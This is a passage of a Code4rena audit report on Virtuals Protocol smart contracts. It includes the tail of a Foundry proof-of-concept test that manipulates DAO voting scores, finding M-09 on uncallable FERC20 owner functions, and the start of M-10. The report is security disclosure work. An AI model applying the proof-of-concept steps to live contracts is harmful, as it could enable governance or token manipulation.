class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Setup proposal and propose\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencodeWithSelector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeTaxTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eselector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescription\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Test Proposal\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epropose\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescription\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eroll\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003escoreOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003escoreOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-09-functions-in-ferc20-cant-be-invoked\" style=\"position:relative;\"\u003e\u003ca href=\"#m-09-functions-in-ferc20-cant-be-invoked\" aria-label=\"m 09 functions in ferc20 cant be invoked permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-37\"\u003e[M-09] Functions in FERC20 can’t be invoked\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-428\"\u003eEPSec\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-814\"\u003eio10\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-544\"\u003eLeoGold\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-731\"\u003eoakcobalt\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FERC20.sol#L121-L129\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FERC20.sol#L121-L129\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-1\" aria-label=\"finding description and impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding Description and Impact\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003eFERC20\u003c/code\u003e contract, there are two functions restricted to be called only by the owner of the token: \u003ccode\u003eupdateMaxTx\u003c/code\u003e and \u003ccode\u003eexcludeFromMaxTx\u003c/code\u003e. These functions are crucial for managing transaction limits and exclusions for specific addresses. However, an issue arises as the owner of the token is the \u003ccode\u003eBonding\u003c/code\u003e contract, which does not expose these functions externally. As a result, no one can call these functions, preventing the update of transaction limits or exclusions.\u003c/p\u003e\n\u003cp\u003eHere is the relevant code snippet from the contract:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_updateMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexcludeFromMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ERC20: Exclude Max Tx from the zero address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisExcludedFromMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-8\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact:\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eTransaction Limit Issues:\u003c/strong\u003e The inability to update the maximum transaction limit leaves the contract inflexible in adapting to changes in market conditions or governance decisions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExclusion Issues:\u003c/strong\u003e Certain addresses that should be exempt from transaction limits cannot be excluded, limiting the ability to manage token holders effectively.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eModify the \u003ccode\u003eBonding\u003c/code\u003e contract to include wrapper functions that externally call \u003ccode\u003eupdateMaxTx\u003c/code\u003e and \u003ccode\u003eexcludeFromMaxTx\u003c/code\u003e for the owner. This ensures these functions are accessible for updates and exclusions.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateMaxTxForOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexcludeFromMaxTxForOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexcludeFromMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-10-missing-totalsupply-reduction-in-burnfrom-allows-supply-manipulation-erc20-violation\" style=\"position:relative;\"\u003e\u003ca href=\"#m-10-missing-totalsupply-reduction-in-burnfrom-allows-supply-manipulation-erc20-violation\" aria-label=\"m 10 missing totalsupply reduction in burnfrom allows supply manipulation erc20 violation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-41\"\u003e[M-10] Missing \u003ccode\u003etotalSupply\u003c/code\u003e reduction in \u003ccode\u003eburnFrom\u003c/code\u003e allows supply manipulation (ERC20 Violation)\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-56\"\u003eAgrawain\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-542\"\u003e0x60scs\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-607\"\u003ebareli\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-218\"\u003ecerweb10\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-450\"\u003eCompetSlayer\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-716\"\u003eDanielTan_MetaTrust\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-777\"\u003eedoscoba\u003c/a\u003e, \u003ca 